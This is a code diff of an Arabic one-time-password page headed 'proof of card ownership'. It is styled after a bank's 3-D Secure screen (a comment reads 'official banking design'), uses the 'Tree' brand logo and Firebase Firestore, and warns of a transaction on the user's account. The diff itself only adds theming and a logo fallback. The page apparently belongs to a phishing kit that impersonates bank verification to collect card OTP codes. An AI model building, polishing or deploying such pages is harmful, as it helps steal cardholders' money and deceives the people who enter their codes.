@@ -3,48 +3,41 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="js/theme-toggle.js"></script>
     <title>رمز التحقق</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/site-theme.css">
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #f5f7fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        
-        /* تصميم بنكي رسمي */
-        .acs-container { background: white; width: 90%; max-width: 420px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.08); overflow: hidden; border: 1px solid #e0e0e0; }
-        .acs-header { background: #fff; padding: 15px 25px; border-bottom: 3px solid #198754; display: flex; justify-content: space-between; align-items: center; }
-        .acs-header h3 { margin: 0; font-size: 16px; color: #333; font-weight: bold; }
-        .acs-header img { height: 25px; }
-
+        body { display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 12px; }
+        .acs-container { width: 90%; max-width: 420px; overflow: hidden; }
+        .acs-header { padding: 15px 25px; display: flex; justify-content: space-between; align-items: center; }
+        .acs-header h3 { margin: 0; font-size: 16px; font-weight: bold; }
+        .acs-header img { height: 28px; object-fit: contain; }
         .acs-body { padding: 25px; }
-        .alert-info { background: #e8f5e9; color: #1b5e20; padding: 10px; border-radius: 6px; font-size: 13px; margin-bottom: 20px; border: 1px solid #c8e6c9; }
-        
+        .alert-info { padding: 10px; border-radius: 10px; font-size: 13px; margin-bottom: 20px; }
         .txn-details { margin-bottom: 20px; font-size: 14px; }
-        .detail-row { display: flex; justify-content: space-between; margin-bottom: 8px; border-bottom: 1px dashed #eee; padding-bottom: 8px; }
-        .detail-label { color: #666; }
-        .detail-value { font-weight: bold; color: #333; }
-
-        label { font-size: 13px; font-weight: bold; display: block; margin-bottom: 8px; color: #333; }
-        input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 6px; font-size: 18px; text-align: center; letter-spacing: 5px; outline: none; margin-bottom: 10px; }
-        input:focus { border-color: #198754; box-shadow: 0 0 0 3px rgba(25, 135, 84, 0.1); }
-        
-        .timer-text { font-size: 12px; color: #d9534f; text-align: center; margin-bottom: 15px; }
-        
-        button { width: 100%; padding: 12px; background: #198754; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 15px; transition: 0.2s; }
-        button:hover { background: #146c43; }
-        
-        .spinner { display: none; margin: 20px auto; border: 4px solid #f3f3f3; border-top: 4px solid #27ae60; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
+        .detail-row { display: flex; justify-content: space-between; margin-bottom: 8px; border-bottom: 1px dashed var(--tree-border); padding-bottom: 8px; }
+        label { font-size: 13px; font-weight: bold; display: block; margin-bottom: 8px; }
+        input { width: 100%; padding: 12px; border-radius: 10px; font-size: 18px; text-align: center; letter-spacing: 5px; margin-bottom: 10px; box-sizing: border-box; }
+        .timer-text { font-size: 12px; text-align: center; margin-bottom: 15px; }
+        button { width: 100%; padding: 12px; font-weight: bold; cursor: pointer; font-size: 15px; transition: 0.2s; }
+        button:hover { filter: brightness(1.05); }
+        .spinner { display: none; margin: 20px auto; border: 4px solid var(--tree-border); border-top: 4px solid var(--tree-primary); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        
-        .footer-secure { margin-top: 20px; text-align: center; opacity: 0.8; }
+        .footer-secure { margin-top: 20px; text-align: center; opacity: 0.85; }
         .footer-secure img { height: 22px; margin: 0 5px; }
     </style>
 </head>
-<body>
+<body class="tree-site otp-page">
+
+<button type="button" class="tree-theme-toggle" onclick="toggleTreeTheme()" aria-label="تبديل الوضع الليلي"><span class="tree-theme-toggle__glyph" aria-hidden="true"></span></button>
 
 <div class="acs-container">
     <div class="acs-header">
         <h3>إثبات ملكية البطاقة</h3>
-        <img src="https://tree.com.sa/assets/images/logo.png" alt="Tree">
+        <img src="images/logo.png" alt="Tree" onerror="this.src='https://placehold.co/100x28/198754/ffffff?text=TREE'">
     </div>
     <div class="acs-body">
         <div class="alert-info">سيتم إجراء معاملة مالية على حسابك المصرفي، يرجى التحقق من التفاصيل أدناه.</div>
